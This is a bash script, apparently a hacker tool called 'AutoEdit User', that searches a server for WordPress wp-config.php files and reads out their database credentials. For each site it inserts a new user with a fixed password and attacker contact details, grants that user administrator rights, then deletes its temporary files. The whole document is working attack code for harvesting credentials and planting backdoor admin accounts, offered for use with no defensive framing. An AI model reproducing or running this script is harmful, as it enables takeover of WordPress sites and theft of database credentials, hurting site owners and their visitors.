#!/bin/bash
blue='\e[0;34'
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
echo -e "$cyan
   _   _   _   _   _   _   _   _     _   _   _   _  
  / \ / \ / \ / \ / \ / \ / \ / \   / \ / \ / \ / \ 
 ( A | u | t | o | E | d | i | t ) ( U | s | e | r )
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/            
\n$okegreen Coded By: HaxorSecKill Infection
"
read -p "Path Your Find WP-CONFIG.PHP: " wp;
read -p "Your Username: " username;
find $wp -name "wp-config.php" 2>/dev/null >> wp.txt
for wpconf in $(cat wp.txt);do
dbname=$(cat $wpconf | grep -oP "DB_NAME',.*" | cut -d " " -f2 | cut -d '"' -f2 | cut -d "'" -f2)
dbuser=$(cat $wpconf | grep -oP "DB_USER',.*" | cut -d " " -f2 | cut -d '"' -f2 | cut -d "'" -f2)
dbpass=$(cat $wpconf | grep -oP "DB_PASSWORD',.*" | cut -d " " -f2 | cut -d '"' -f2 | cut -d "'" -f2)
prefix=$(cat $wpconf | grep "table_prefix.*" | cut -d "'" -f2 | cut -d "'" -f2)
echo " "
echo -e "$cyan[+]$okegreen Getting Config From $wpconf"
echo -e "$cyan[*]$okegreen dbname: $dbname|dbuser: $dbuser|dbpassword: $dbpass |table_prefix: $prefix"
sleep 2
echo -e "$cyan[+]$yellow Trying Added Username and Password:$okegreen $username $cyan|$okegreen HaxorSecInfec"

# addUser
echo "INSERT INTO \`${prefix}users\` (\`ID\`, \`user_login\`, \`user_pass\`, \`user_nicename\`, \`user_email\`, \`user_url\`, \`user_registered\`, \`user_activation_key\`, \`user_status\`, \`display_name\`) VALUES (null, '$username', MD5('HaxorSecInfec'), 'haxorsec', 'gishvasah@gmail.com','http://www.haxorsecgacor.com/', '2018-04-17 00:00:00', '', '0', 'HaxorAdmin');" > s.sql
mysql -u $dbuser -p$dbpass -D $dbname < s.sql 2>/dev/null

# cek user
mysql -u $dbuser -p$dbpass -D $dbname -e "select ID from ${prefix}users where user_login='${username}';" > user.txt 2>/dev/null
if [[ -s user.txt ]];
then
  id=$(cat user.txt | sed -n 2p)
  echo -e "$cyan[+]$yellow Your ID:$okegreen $id"
  sleep 2
  # get link url
  mysql -u $dbuser -p$dbpass -D $dbname -e "SELECT option_value FROM ${prefix}options WHERE option_name IN ('siteurl');" > link.txt 2>/dev/null
  link=$(cat link.txt | sed -n 2p)
  echo -e "$cyan[+]$yellow Url Login :$okegreen $link/wp-login.php"
  sleep 2
  # add admin capabilities
  echo "INSERT INTO \`${prefix}usermeta\` (\`umeta_id\`, \`user_id\`, \`meta_key\`, \`meta_value\`) VALUES (NULL, '${id}', '${prefix}capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}');" > s.sql
  mysql -u $dbuser -p$dbpass -D $dbname < s.sql 2>/dev/null
  #clear all 
  echo -e "$cyan[+]$okegreen Successfull AddUser admin!"
  sleep 2
  echo " "
  rm -rf wp.txt user.txt link.txt s.sql
else
  rm -rf wp.txt user.txt link.txt s.sql
  echo -e "$cyan[+]$red Failed AddUser admin!"
fi
done
